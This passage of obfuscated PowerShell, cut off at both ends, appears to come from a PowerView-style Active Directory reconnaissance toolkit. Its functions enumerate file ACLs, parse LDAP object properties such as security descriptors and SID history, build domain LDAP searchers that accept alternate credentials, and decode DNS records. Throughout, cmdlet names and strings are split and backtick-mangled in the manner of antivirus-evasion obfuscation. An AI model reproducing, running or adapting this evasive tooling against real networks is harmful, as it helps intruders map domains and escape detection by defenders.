        ${C`Re`de`NTial} =   $21GV7e::"E`MpTY"
    )

    BEGIN {

        function c`ON`Vert-`Fi`LErIGHT {
            
            [CmdletBinding()]
            Param(
                [Int]
                ${f`sr}
            )

            ${aCCEs`S`masK} = @{
                [uint32]("{0}{2}{1}"-f'0x8','00','00000') = ("{0}{2}{1}" -f 'Gen','ead','ericR')
                [uint32]("{2}{0}{1}"-f'x4000000','0','0') = ("{2}{3}{1}{0}"-f'e','Writ','Generi','c')
                [uint32]("{1}{0}{2}" -f'00000','0x20','0') = ("{3}{2}{1}{0}" -f 'cute','e','ricEx','Gene')
                [uint32]("{0}{1}{2}"-f'0x1000','0','000') = ("{2}{0}{1}" -f 'nericA','ll','Ge')
                [uint32]("{0}{2}{1}"-f'0x02','00','0000') = ("{1}{3}{0}{2}" -f 'mum','M','Allowed','axi')
                [uint32]("{1}{0}{2}"-f'00000','0x01','0') = ("{3}{0}{6}{5}{4}{1}{2}" -f 'ce','Securit','y','Ac','m','e','ssSyst')
                [uint32]("{0}{2}{1}" -f '0','0','x0010000') = ("{0}{1}{2}"-f 'S','ynchro','nize')
                [uint32]("{1}{2}{3}{0}"-f '0','0x00','080','00') = ("{1}{0}{2}" -f'eOwne','Writ','r')
                [uint32]("{0}{1}{2}" -f '0x0004','0','000') = ("{0}{1}{2}"-f 'Wri','te','DAC')
                [uint32]("{2}{1}{0}"-f'00','00200','0x0') = ("{2}{1}{0}"-f 'ntrol','Co','Read')
                [uint32]("{0}{1}{2}"-f '0x0','00100','00') = ("{1}{0}"-f'te','Dele')
                [uint32]("{1}{0}{2}"-f'00','0x000','100') = ("{4}{3}{0}{1}{2}" -f 'tr','ibut','es','eAt','Writ')
                [uint32]("{1}{0}{2}"-f'x00000','0','080') = ("{2}{3}{4}{1}{0}" -f'es','ribut','Rea','d','Att')
                [uint32]("{2}{0}{1}" -f '00','040','0x000') = ("{3}{0}{2}{1}"-f 'ele','Child','te','D')
                [uint32]("{1}{0}{2}"-f'0','0x0','000020') = ("{2}{4}{3}{0}{1}"-f'er','se','Ex','cute/Trav','e')
                [uint32]("{1}{0}{2}"-f'00','0x','000010') = ("{6}{2}{5}{1}{4}{0}{3}" -f'te','ttrib','e','s','u','ndedA','WriteExt')
                [uint32]("{0}{1}{2}" -f '0','x0','0000008') = ("{2}{3}{5}{1}{4}{0}" -f 'butes','ExtendedA','Re','a','ttri','d')
                [uint32]("{0}{2}{1}" -f'0x','4','0000000') = ("{2}{3}{7}{5}{0}{4}{1}{6}"-f 'bdi','e','A','p','r','ata/AddSu','ctory','pendD')
                [uint32]("{2}{3}{1}{0}"-f '02','000000','0','x') = ("{1}{3}{2}{0}" -f'e','Write','ta/AddFil','Da')
                [uint32]("{0}{2}{1}" -f '0x','000001','00') = ("{2}{4}{3}{0}{5}{1}{6}" -f'Di','ector','Re','List','adData/','r','y')
            }

            ${SIM`p`lEPeRm`is`S`IOns} = @{
                [uint32]("{2}{1}{0}"-f 'ff','01','0x1f') = ("{1}{0}{2}{3}" -f 'ul','F','lCon','trol')
                [uint32]("{0}{2}{1}" -f '0x03','1bf','0') = ("{1}{0}"-f'odify','M')
                [uint32]("{0}{1}"-f'0x0200','a9') = ("{2}{1}{0}" -f'ecute','ndEx','ReadA')
                [uint32]("{0}{1}" -f'0x','02019f') = ("{1}{3}{2}{0}" -f 'ite','ReadA','dWr','n')
                [uint32]("{1}{0}"-f'0089','0x02') = ("{1}{0}"-f'd','Rea')
                [uint32]("{2}{0}{1}" -f '1','16','0x000') = ("{1}{0}"-f 'e','Writ')
            }

            ${PERM`IssIO`NS} = @()

            
            ${P`ERMIs`sI`onS} += ${sIMp`LEP`erMi`sSio`NS}."K`eyS" | &("{2}{3}{0}{1}"-f 'h-Objec','t','ForEa','c') {
                              if ((${f`sr} -band ${_}) -eq ${_}) {
                                ${SimPL`Ep`eRMissiO`Ns}[${_}]
                                ${f`sr} = ${F`Sr} -band (-not ${_})
                              }
                            }

            
            ${pE`RMIs`S`IoNs} += ${a`CcEs`smA`Sk}."K`EyS" | &("{2}{0}{1}"-f 'bje','ct','Where-O') { ${F`sr} -band ${_} } | &("{3}{0}{2}{1}" -f'orEac','t','h-Objec','F') { ${a`ccEssMA`sk}[${_}] }
            (${PeR`miss`iO`Ns} | &("{0}{1}{2}"-f'Where-O','bjec','t') {${_}}) -join ','
        }

        ${COnVe`R`TArg`UMEn`Ts} = @{}
        if (${Ps`B`O`U`Ndp`ARAMETers}[("{0}{2}{1}" -f 'C','ential','red')]) { ${co`NVeRTaR`GU`Men`Ts}[("{0}{1}{2}" -f 'Cr','eden','tial')] = ${CReDen`T`IaL} }

        ${map`p`EDcomp`UT`ErS} = @{}
    }

    PROCESS {
        ForEach (${t`ARG`etPA`Th} in ${P`AtH}) {
            try {
                if ((${Ta`RGeT`p`Ath} -Match ((("{0}{3}{1}{2}"-f '7Xd7Xd7Xd7Xd','*7X','d7Xd.*','.'))-rEpLace([cHAR]55+[cHAR]88+[cHAR]100),[cHAR]92)) -and (${pSbOU`NDpa`RaME`TERs}[("{3}{0}{1}{2}"-f'red','ent','ial','C')])) {
                    ${H`oS`TCOmPu`Ter} = (&("{2}{1}{0}" -f 'ect','bj','New-O') ("{0}{1}{2}" -f 'Sy','stem.','Uri')(${Ta`RGetp`ATH}))."Ho`sT"
                    if (-not ${MAppE`dCom`p`UT`eRS}[${hoSTcOm`p`Ut`er}]) {
                        
                        &("{2}{4}{0}{1}{3}"-f 'ne','c','Add-RemoteC','tion','on') -ComputerName ${HoST`co`MpUT`eR} -Credential ${c`R`EDeNt`IAl}
                        ${M`APPE`dCOM`P`UteRS}[${hOS`TcO`M`puter}] = ${tR`UE}
                    }
                }

                ${A`CL} = &("{0}{1}"-f'Ge','t-Acl') -Path ${Ta`RgE`Tp`Ath}

                ${a`CL}."Ge`Tacce`s`sR`UleS"(${T`Rue}, ${TR`UE}, [System.Security.Principal.SecurityIdentifier]) | &("{4}{0}{1}{3}{2}" -f'or','Each','ect','-Obj','F') {
                    ${S`ID} = ${_}."i`DE`NTiT`yR`EfEreNcE"."v`ALuE"
                    ${Na`mE} = &("{0}{1}{2}" -f'Con','vertFrom','-SID') -ObjectSID ${s`Id} @ConvertArguments

                    ${O`Ut} = &("{1}{2}{0}" -f 't','New-O','bjec') ("{1}{0}{2}" -f'bjec','PSO','t')
                    ${o`UT} | &("{2}{0}{1}" -f 'dd-M','ember','A') ("{1}{2}{0}{3}" -f'rop','Not','ep','erty') ("{1}{0}"-f 'ath','P') ${taR`Ge`TPath}
                    ${o`Ut} | &("{1}{2}{0}"-f'ber','Add-M','em') ("{1}{3}{2}{0}" -f'erty','Not','p','epro') ("{1}{4}{0}{2}{3}" -f 'emRi','FileSy','ght','s','st') (&("{2}{1}{0}{3}" -f'il','t-F','Conver','eRight') -FSR ${_}."FILESyS`TE`MRi`Gh`TS"."valU`e__")
                    ${O`Ut} | &("{0}{1}{2}"-f'Ad','d','-Member') ("{1}{0}{3}{2}" -f 'ro','Notep','ty','per') ("{4}{0}{5}{3}{2}{1}"-f'enti','ce','eren','Ref','Id','ty') ${n`AMe}
                    ${o`Ut} | &("{0}{3}{2}{1}" -f'Add','er','emb','-M') ("{2}{0}{1}" -f 'eprope','rty','Not') ("{0}{1}{2}" -f 'Ide','n','titySID') ${S`iD}
                    ${O`Ut} | &("{1}{0}{2}" -f 'd','Ad','-Member') ("{2}{1}{0}{3}" -f'ro','p','Note','perty') ("{0}{3}{1}{2}" -f 'A','ontrolTyp','e','ccessC') ${_}."ac`ceSS`c`OnTRolType"
                    ${O`UT}."PsOb`Ject"."t`YPenAmeS".("{0}{1}"-f'Inser','t').Invoke(0, ("{3}{1}{2}{0}" -f 'CL','owerV','iew.FileA','P'))
                    ${o`Ut}
                }
            }
            catch {
                &("{2}{0}{1}" -f'erbo','se','Write-V') ('[Get-PathAc'+'l]'+' '+'er'+'ror: '+"$_")
            }
        }
    }

    END {
        
        ${M`APPe`dcOmpu`T`ERS}."kE`YS" | &("{3}{5}{0}{2}{4}{1}" -f 've-Remote','ection','Con','R','n','emo')
    }
}


function cOnVE`R`T-l`DApp`ROp`ERtY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{1}{2}{0}" -f 'rocess','uld','P','ho','PSS'}, '')]
    [OutputType({"{8}{4}{0}{7}{1}{3}{5}{2}{6}"-f 'a','t.Automation.','m','PSCust','ystem.M','o','Object','nagemen','S'})]
    [CmdletBinding()]
    Param(
        [Parameter(MAnDaTorY = ${T`RUe}, vALuEFrOmPIPELINe = ${Tr`UE})]
        [ValidateNotNullOrEmpty()]
        ${pR`op`eRties}
    )

    ${o`BJEcT`pRopert`iEs} = @{}

    ${pRO`pERt`Ies}."P`ROP`ert`yn`AmeS" | &("{1}{0}{2}"-f 'je','ForEach-Ob','ct') {
        if (${_} -ne ("{1}{0}"-f 'dspath','a')) {
            if ((${_} -eq ("{1}{2}{0}"-f'tsid','obj','ec')) -or (${_} -eq ("{2}{0}{1}"-f 'idhistor','y','s'))) {
                
                ${O`BjeCtpro`Pe`RT`IeS}[${_}] = ${PropE`RT`I`ES}[${_}] | &("{2}{0}{1}{3}" -f 'h','-Ob','ForEac','ject') { (&("{3}{2}{1}{0}" -f 'ct','w-Obje','e','N') ("{1}{0}{3}{6}{11}{8}{10}{4}{5}{2}{7}{9}"-f 'y','S','it','stem.','u','r','Secur','yI','incipal.S','dentifier','ec','ity.Pr')(${_}, 0))."VA`LUE" }
            }
            elseif (${_} -eq ("{2}{1}{0}"-f'type','roup','g')) {
                ${oB`JE`cT`P`R`oPERTIeS}[${_}] = ${PR`OperTi`ES}[${_}][0] -as ${gRO`UpTyPee`N`Um}
            }
            elseif (${_} -eq ("{0}{1}{3}{2}" -f's','amaccountt','pe','y')) {
                ${ObJe`CTpRo`Pe`RTI`ES}[${_}] = ${P`ROP`ER`TiES}[${_}][0] -as ${s`Amacc`O`UNTTyPe`e`Num}
            }
            elseif (${_} -eq ("{3}{1}{0}{2}" -f 'g','t','uid','objec')) {
                
                ${OBjecTP`RopE`Rt`ies}[${_}] = (&("{1}{2}{0}" -f'-Object','Ne','w') ("{0}{1}" -f 'G','uid') (,${pR`op`e`RtIes}[${_}][0]))."g`UId"
            }
            elseif (${_} -eq ("{1}{3}{4}{2}{0}" -f 'ol','user','r','acco','untcont')) {
                ${oBjec`Tp`RO`peRt`Ies}[${_}] = ${pro`Per`TIeS}[${_}][0] -as ${uACE`N`UM}
            }
            elseif (${_} -eq ("{1}{3}{0}{2}" -f 'uritydescript','nts','or','ec')) {
                
                ${D`ES`cR`iPTor} = &("{3}{0}{2}{1}"-f'e','Object','w-','N') ("{11}{12}{10}{1}{0}{7}{8}{3}{6}{4}{9}{2}{5}"-f '.R','ntrol','pto','t','Des','r','y','awSe','curi','cri','sCo','Se','curity.Acces') -ArgumentList ${pRO`PER`Ti`eS}[${_}][0], 0
                if (${DE`ScrI`ptor}."oW`NeR") {
                    ${O`B`j`eC`TPrOpeRTi`es}[("{1}{0}"-f'er','Own')] = ${DeS`cRIpT`oR}."ow`Ner"
                }
                if (${d`ES`CriPtOR}."Gro`UP") {
                    ${o`B`jeCTprOpERT`ies}[("{0}{1}"-f'G','roup')] = ${dE`s`cRIPToR}."g`Roup"
                }
                if (${de`ScRIP`TOR}."DI`S`CreTIoNArYA`Cl") {
                    ${obJE`CtpRoP`E`RTIES}[("{2}{0}{1}{4}{3}" -f'iscretio','na','D','yAcl','r')] = ${Des`c`Riptor}."d`ISCreTiO`Na`RyA`cL"
                }
                if (${dEsCRip`T`Or}."Sy`st`em`ACL") {
                    ${obj`ectpR`O`per`TIes}[("{1}{2}{0}"-f 'Acl','Syst','em')] = ${D`escRI`pTOR}."s`Y`St`eMAcL"
                }
            }
            elseif (${_} -eq ("{1}{3}{2}{0}" -f'res','ac','ountexpi','c')) {
                if (${PR`OPer`T`ieS}[${_}][0] -gt  (  VARiaBlE ('eZ'+'Y')  -vALUeo)::"M`AxVa`luE"."tic`KS") {
                    ${OBJEC`TpRO`PerT`IeS}[${_}] = ("{0}{1}"-f 'NEVE','R')
                }
                else {
                    ${ObjEC`TPR`OpErt`ies}[${_}] =  (Get-vArIabLE ('E'+'Zy')  -VA  )::"fr`om`FiLeTiMe"(${p`R`OPER`TiEs}[${_}][0])
                }
            }
            elseif ( (${_} -eq ("{1}{0}{2}"-f 'tl','las','ogon')) -or (${_} -eq ("{1}{0}{3}{2}" -f 'astlogontim','l','stamp','e')) -or (${_} -eq ("{0}{1}{2}" -f 'pwdlas','t','set')) -or (${_} -eq ("{3}{2}{1}{0}"-f 'ff','logo','t','las')) -or (${_} -eq ("{2}{1}{3}{4}{0}"-f'Time','dPas','ba','swor','d')) ) {
                
                if (${p`ROpeRT`IeS}[${_}][0] -is [System.MarshalByRefObject]) {
                    
                    ${t`EmP} = ${P`RO`PeRTIeS}[${_}][0]
                    [Int32]${h`IgH} = ${te`mP}.("{1}{2}{0}" -f'ype','Get','T').Invoke().("{1}{2}{0}"-f 'er','InvokeMem','b').Invoke(("{2}{0}{1}" -f 'hP','art','Hig'),  $Up9::"G`E`T`prOpErTy", ${n`ULl}, ${te`mP}, ${NU`LL})
                    [Int32]${l`ow}  = ${Te`mp}.("{1}{0}"-f'tType','Ge').Invoke().("{1}{2}{0}{3}"-f'okeMembe','I','nv','r').Invoke(("{0}{1}"-f 'LowP','art'),    (  geT-vArIABle  uP9  -VA)::"G`ETP`R`opeRtY", ${n`ULl}, ${TE`mp}, ${n`ULL})
                    ${o`B`jectp`RO`per`TIeS}[${_}] = ( $Ezy::"Fr`OMfILe`TI`Me"([Int64]("0x{0:x8}{1:x8}" -f ${Hi`gH}, ${L`ow})))
                }
                else {
                    
                    ${oBJ`E`CTP`R`OPertIEs}[${_}] = ( (GeT-VaRiAble ezY -VAl )::"FRoMFI`leT`imE"((${prO`per`T`ieS}[${_}][0])))
                }
            }
            elseif (${pROpE`R`T`IeS}[${_}][0] -is [System.MarshalByRefObject]) {
                
                ${PR`OP} = ${Pr`OpER`TIEs}[${_}]
                try {
                    ${Te`MP} = ${p`RoP}[${_}][0]
                    [Int32]${H`IGH} = ${tE`mp}.("{0}{2}{1}"-f 'GetTy','e','p').Invoke().("{1}{2}{0}"-f'er','InvokeM','emb').Invoke(("{0}{1}"-f'High','Part'),   ( varIablE  Up9 -vaLUEon)::"GeT`proP`e`Rty", ${n`ULL}, ${T`emp}, ${n`ULL})
                    [Int32]${L`oW}  = ${TE`mp}.("{1}{0}{2}"-f 'et','G','Type').Invoke().("{0}{2}{1}{3}"-f 'Invo','b','keMem','er').Invoke(("{2}{0}{1}" -f'ow','Part','L'),    (  VARiaBLe  ("uP"+"9") ).vAlUe::"GETP`R`oP`erty", ${nu`lL}, ${t`EMP}, ${N`Ull})
                    ${o`B`j`Ec`TPrOPe`RTIeS}[${_}] = [Int64]("0x{0:x8}{1:x8}" -f ${hI`gH}, ${L`Ow})
                }
                catch {
                    &("{0}{2}{1}" -f 'W','e-Verbose','rit') ('[Convert'+'-LDA'+'PPr'+'operty] '+'erro'+'r'+': '+"$_")
                    ${OBJE`c`TprOp`eR`T`iES}[${_}] = ${pR`oP}[${_}]
                }
            }
            elseif (${PRO`pE`RTieS}[${_}]."COU`Nt" -eq 1) {
                ${OBjeCTPRo`PE`R`TieS}[${_}] = ${Pr`oPe`RTiEs}[${_}][0]
            }
            else {
                ${oBjeCtp`ROP`eRtI`Es}[${_}] = ${Pro`p`eRtI`Es}[${_}]
            }
        }
    }
    try {
        &("{3}{1}{0}{2}"-f'je','w-Ob','ct','Ne') -TypeName ("{1}{0}{2}" -f'bjec','PSO','t') -Property ${OB`Jec`TP`ROperT`iES}
    }
    catch {
        &("{0}{1}{2}{3}"-f 'Writ','e-Warni','n','g') ('[Co'+'nver'+'t-LDAP'+'Proper'+'ty] '+'E'+'rror '+'pa'+'rs'+'ing '+'LDA'+'P '+'p'+'ro'+'perties'+' '+': '+"$_")
    }
}








function G`Et`-domAiNS`eaRc`her {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{3}"-f'PSSh','uld','o','Process'}, '')]
    [OutputType({"{2}{3}{5}{1}{6}{4}{0}" -f'r','rySer','Sy','stem','irectorySearche','.Directo','vices.D'})]
    [CmdletBinding()]
    Param(
        [Parameter(VAlUefROmpipELINe = ${tr`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`m`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'lter','Fi'})]
        [String]
        ${l`d`APF`iLTeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRO`PE`RtieS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'ADSP','ath'})]
        [String]
        ${SEArc`h`BA`sE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${SeARc`HbA`SEPRe`FiX},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{1}{0}{3}{2}"-f 'inCon','oma','oller','tr','D'})]
        [String]
        ${ser`V`ER},

        [ValidateSet({"{0}{1}" -f 'B','ase'}, {"{1}{0}{2}" -f'Lev','One','el'}, {"{2}{0}{1}" -f 'tre','e','Sub'})]
        [String]
        ${S`ea`R`ChSCOpE} = ("{0}{1}"-f'Subtr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${Re`sUL`TpAGe`siZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`e`RVE`RTi`mEL`IMiT} = 120,

        [ValidateSet({"{0}{1}"-f 'Dac','l'}, {"{0}{1}" -f 'Gro','up'}, {"{0}{1}" -f'Non','e'}, {"{0}{1}"-f'Ow','ner'}, {"{0}{1}" -f 'Sa','cl'})]
        [String]
        ${s`ecU`RiTyM`ASks},

        [Switch]
        ${tOMBs`T`oNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`EdEnT`IAl} =  (gEt-vArIablE  ('21GV'+'7e') -vaLUE)::"EmP`Ty"
    )

    PROCESS {
        if (${Ps`B`ounDpARA`mETerS}[("{2}{1}{0}"-f 'in','ma','Do')]) {
            ${tA`RGeTDO`M`Ain} = ${dOm`AIN}

            if (${EnV`:uSEr`D`NS`DoMAIn} -and (${eNV`:USeRD`Nsd`Om`AIn}.("{0}{1}"-f 'Tri','m').Invoke() -ne '')) {
                
                ${u`SE`RDOMaIn} = ${E`N`V:us`eRDNs`DOMa`In}
                if (${env:`log`oNS`eRVeR} -and (${eNV`:lo`gOns`e`RveR}.("{1}{0}" -f'im','Tr').Invoke() -ne '') -and ${u`se`R`DOMAin}) {
                    ${b`IN`dsERv`Er} = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif (${ps`BOUn`d`pAr`AmET`ERS}[("{1}{0}{2}"-f'edenti','Cr','al')]) {
            
            ${D`o`Ma`iNObjEct} = &("{0}{1}{2}"-f'G','et-','Domain') -Credential ${cR`E`DE`NTial}
            ${bi`N`DSeRver} = (${d`Om`AIn`OBJECT}."pDcRO`le`OwNER")."Na`Me"
            ${tar`gE`TDo`Main} = ${DomaiNO`B`jEcT}."NA`ME"
        }
        elseif (${eNV:`U`SE`RDnsDOMaIN} -and (${e`NV:`USe`Rd`N`sDOMAin}.("{0}{1}"-f'Tr','im').Invoke() -ne '')) {
            
            ${tArGe`TDOm`AIn} = ${eN`V:u`ser`d`NsDomaIn}
            if (${E`Nv:`LogOnS`ErVEr} -and (${enV:Lo`gOn`S`e`RVeR}.("{0}{1}" -f 'Tr','im').Invoke() -ne '') -and ${TargeTD`o`ma`In}) {
                ${bIN`Ds`E`RvER} = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            
            &("{1}{3}{0}{2}" -f 'erbo','wr','se','ite-v') ("{2}{1}{0}{3}"-f 'ma','et-do','g','in')
            ${D`oMai`NOBjeCT} = &("{1}{2}{0}" -f'omain','Ge','t-D')
            ${b`iNdS`ErVeR} = (${domaI`NoBj`eCT}."pDC`R`Ol`Eowner")."n`Ame"
            ${T`Ar`geTDOMain} = ${DOMaI`Nobj`E`CT}."Na`Me"
        }

        if (${P`sB`OU`Nd`parAM`ETeRs}[("{1}{0}"-f'rver','Se')]) {
            
            ${bIn`dsER`V`ER} = ${ser`VEr}
        }

        ${sEar`CHs`Tri`Ng} = ("{1}{0}"-f'DAP://','L')

        if (${B`inDsER`VeR} -and (${b`IndSer`VER}.("{1}{0}"-f 'm','Tri').Invoke() -ne '')) {
            ${SEARCh`ST`R`inG} += ${Bi`NDse`RVEr}
            if (${t`ARgetd`OMAin}) {
                ${S`eA`RC`hS`TRING} += '/'
            }
        }

        if (${psbo`U`N`dpA`RAMEtERS}[("{2}{4}{0}{1}{3}"-f 'Ba','sePrefi','Searc','x','h')]) {
            ${sE`AR`cHSTRIng} += ${SEARCHb`AS`ep`REFIx} + ','
        }

        if (${p`SB`oUn`dpaRA`mET`erS}[("{0}{1}{2}" -f 'Se','archBas','e')]) {
            if (${se`ArChB`A`Se} -Match ("{1}{0}" -f'//','^GC:')) {
                
                ${dn} = ${s`eAR`ChBASe}.("{1}{0}"-f 'Upper','To').Invoke().("{0}{1}" -f 'T','rim').Invoke('/')
                ${Sear`cHs`Tr`ing} = ''
            }
            else {
                if (${s`EaRCh`BasE} -match ("{0}{2}{1}"-f'^LDAP','//',':')) {
                    if (${sea`RcH`Ba`SE} -match ("{1}{0}{2}{3}" -f'AP://','LD','.+','/.+')) {
                        ${sEaRC`HS`TRING} = ''
                        ${dn} = ${Sear`CH`BAse}
                    }
                    else {
                        ${DN} = ${seA`R`cHbaSE}.("{1}{2}{0}{3}" -f 'rin','Su','bSt','g').Invoke(7)
                    }
                }
                else {
                    ${DN} = ${sE`Ar`chBase}
                }
            }
        }
        else {
            
            if (${ta`RG`Et`domAIN} -and (${taR`GEtD`o`maIn}.("{1}{0}"-f'im','Tr').Invoke() -ne '')) {
                ${d`N} = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        ${SEarCH`sTr`I`Ng} += ${Dn}
        &("{2}{3}{0}{1}{4}"-f'ite-Ver','b','W','r','ose') ('[Get-Dom'+'a'+'inSea'+'rche'+'r'+']'+' '+'sear'+'ch '+'ba'+'se: '+"$SearchString")

        if (${c`R`EDeNtiAL} -ne  (  Item  ("V"+"Aria"+"bL"+"E:21GV7E")).VaLuE::"em`pty") {
            &("{3}{2}{1}{0}" -f'e-Verbose','t','ri','W') ("{17}{12}{16}{11}{15}{18}{3}{14}{5}{6}{7}{13}{4}{8}{2}{0}{19}{1}{9}{10}" -f 't','r L','eden','he','rnate ',']',' Usin','g ','cr','DAP connectio','n','-','Ge','alte','r','Do','t','[','mainSearc','ials fo')
            
            ${do`MAiNObj`e`Ct} = &("{2}{1}{0}"-f 'ject','ew-Ob','N') ("{3}{2}{1}{5}{7}{8}{0}{4}{6}{9}"-f'Direc','ctor','ire','D','toryEn','yServi','tr','c','es.','y')(${s`e`ARChSt`RInG}, ${CRED`E`N`TIAL}."uSe`R`NAme", ${CRed`enti`AL}.("{2}{0}{3}{1}" -f 'etworkC','al','GetN','redenti').Invoke()."P`AssW`oRd")
            ${Se`ARcH`er} = &("{1}{2}{0}"-f 'ject','N','ew-Ob') ("{7}{5}{2}{8}{3}{4}{6}{0}{9}{1}" -f 'ect','archer','Directo','yServ','ices.','ystem.','Dir','S','r','orySe')(${Do`mA`iNOBJEct})
        }
        else {
            
            ${Sea`RC`HEr} = &("{0}{2}{1}" -f 'New-','bject','O') ("{4}{0}{8}{3}{7}{9}{5}{10}{11}{2}{6}{12}{1}" -f 's','r','ct','.Direct','Sy','v','orySear','oryS','tem','er','ices.Di','re','che')([ADSI]${sEa`RCHSt`RINg})
        }

        ${SEA`R`ch`ER}."Pag`ESi`zE" = ${r`ESultpA`GeSiZE}
        ${sE`Ar`CHER}."Sea`RC`hsCOPE" = ${SeaRcH`sc`OPe}
        ${sEa`Rc`hEr}."CAcHER`esu`L`TS" = ${F`A`LSe}
        ${S`eArCH`eR}."R`e`FErRALcHas`inG" =   ( variabLe  uIg).VAluE::"a`ll"

        if (${PSbOUn`Dp`ArAm`EtERS}[("{3}{2}{1}{0}" -f 'eLimit','rverTim','e','S')]) {
            ${SEar`c`heR}."s`eRvErTiME`LI`MIt" = ${ServE`RT`imeLi`Mit}
        }

        if (${P`sbOun`dpAR`AMET`e`Rs}[("{2}{1}{0}" -f'e','n','Tombsto')]) {
            ${S`EAr`Cher}."toMbs`T`ONe" = ${t`RUe}
        }

        if (${PSBOUn`dpaRaME`T`ERs}[("{2}{0}{1}"-f 'PFil','ter','LDA')]) {
            ${sea`RcH`er}."Fil`T`ER" = ${ld`AP`FILter}
        }

        if (${ps`BoUNDPa`Ra`mETeRs}[("{1}{2}{0}"-f 'Masks','S','ecurity')]) {
            ${S`ear`c`hER}."s`E`cUrIT`y`MASKs" = Switch (${SecUr`ItYM`A`S`Ks}) {
                ("{0}{1}"-f'D','acl') {  ( gET-vaRiable  ('W7'+'tv6'+'z') ).VAlue::"d`ACl" }
                ("{1}{0}" -f 'up','Gro') {   ( itEM  vaRiabLE:W7tv6z).vAlUE::"gr`oUp" }
                ("{0}{1}"-f 'No','ne') {   ( gET-VArIABle  W7TV6z  ).vAluE::"n`oNE" }
                ("{0}{1}"-f 'Ow','ner') {  (GCI  variablE:W7TV6z  ).value::"o`WNER" }
                ("{0}{1}" -f'S','acl') {  ( vAriABlE W7tV6Z -ValueO  )::"sa`CL" }
            }
        }

        if (${pS`B`oUNDpaR`AmeTers}[("{1}{0}{2}"-f'ropert','P','ies')]) {
            
            ${PrO`per`TieStO`L`oAD} = ${pRo`perti`Es}| &("{2}{1}{0}" -f'ject','rEach-Ob','Fo') { ${_}.("{1}{0}"-f'it','Spl').Invoke(',') }
            ${nu`Ll} = ${seArCH`er}."PRO`PeRTiesT`O`L`OaD".("{2}{1}{0}" -f'Range','dd','A').Invoke((${p`ROpErti`EsT`OL`OAd}))
        }

        ${Sea`R`CheR}
    }
}


function CoNVe`RT-D`N`sRE`C`orD {


    [OutputType({"{8}{5}{9}{0}{4}{2}{7}{6}{10}{1}{3}{11}"-f'eme','Cust','tom','om','nt.Au','tem.M','.P','ation','Sys','anag','S','Object'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosITION = 0, MaNDaToRy = ${TR`UE}, vAluEfROmPIpELiNeBYPRopeRtYNAme = ${t`RUE})]
        [Byte[]]
        ${DnSR`EC`ord}
    )

    BEGIN {
        function GeT`-N`AmE {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{4}{2}{1}"-f'PSU','orrectly','tputTypeC','seO','u'}, '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${R`AW}
            )

            [Int]${L`EN`Gth} = ${r`AW}[0]
            [Int]${s`EgM`EnTs} = ${r`AW}[1]
            [Int]${Ind`EX} =  2
            [String]${N`AmE}  = ''

            while (${se`gmE`NTs}-- -gt 0)
            {
                [Int]${SEgme`N`TlEn`GTh} = ${R`AW}[${I`ND`eX}++]
                while (${SeGmE`N`TLEnGth}-- -gt 0) {
                    ${n`AMe} += [Char]${r`Aw}[${ind`Ex}++]
                }
                ${n`AmE} += "."
            }
            ${N`AMe}
        }
    }

    PROCESS {
        
        ${Rd`A`TATYPe} =  (  vARIabLE  ("2emq"+"h"+"6") -VAlU  )::("{0}{1}" -f 'ToUInt1','6').Invoke(${DnsR`EC`ORd}, 2)
        ${uPdATE`DAtSE`R`I`AL} =   (  LS  ("VarIaB"+"lE:2"+"EM"+"qH6")).VaLue::("{0}{1}{2}"-f 'ToUI','nt','32').Invoke(${dnsR`e`COrd}, 8)

        ${t`TlrAW} = ${D`NsrE`cOrD}[12..15]

        
        ${N`ULl} =   $Fl1::("{1}{0}" -f 'rse','Reve').Invoke(${tT`LRaW})
        ${t`TL} =   ( geT-VariaBle 2EMqH6  -va  )::("{2}{0}{1}" -f '3','2','ToUInt').Invoke(${tTl`R`Aw}, 0)

        ${A`GE} =  ( vARiaBlE ('2'+'EMQ'+'h6')  -VaLueOnLy )::("{1}{0}{2}"-f'Int3','ToU','2').Invoke(${dNsR`EC`oRD}, 20)
        if (${A`Ge} -ne 0) {
            ${tIm`Es`TAMP} = ((&("{2}{1}{0}"-f 'Date','et-','G') -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).("{1}{2}{0}"-f'dHours','A','d').Invoke(${A`gE})).("{2}{0}{1}"-f 'oStri','ng','T').Invoke()
        }
        else {
            ${tIM`Est`AMp} = ("{1}{2}{0}"-f ']','[s','tatic')
        }

        ${dNS`RECord`ob`j`ect} = &("{3}{2}{1}{0}"-f 'ect','bj','O','New-') ("{0}{1}" -f 'PSOb','ject')

        if (${rd`A`TATyPe} -eq 1) {
            ${I`P} = "{0}.{1}.{2}.{3}" -f ${dN`SrE`CoRD}[24], ${dN`sr`eC`orD}[25], ${Dns`R`ecORD}[26], ${Dn`SreCo`RD}[27]
            ${dA`Ta} = ${Ip}
            ${dNSrEco`RDo`BJeCT} | &("{2}{0}{1}" -f 'mbe','r','Add-Me') ("{0}{1}{2}{3}" -f'N','ot','epropert','y') ("{2}{1}{0}" -f'ype','rdT','Reco') 'A'
        }

        elseif (${r`dATaTy`Pe} -eq 2) {
            ${nS`N`AME} = &("{0}{2}{1}" -f'G','t-Name','e') ${dNsREC`o`Rd}[24..${dNSR`ec`oRD}."LENG`Th"]
            ${D`ATA} = ${N`sn`AMe}
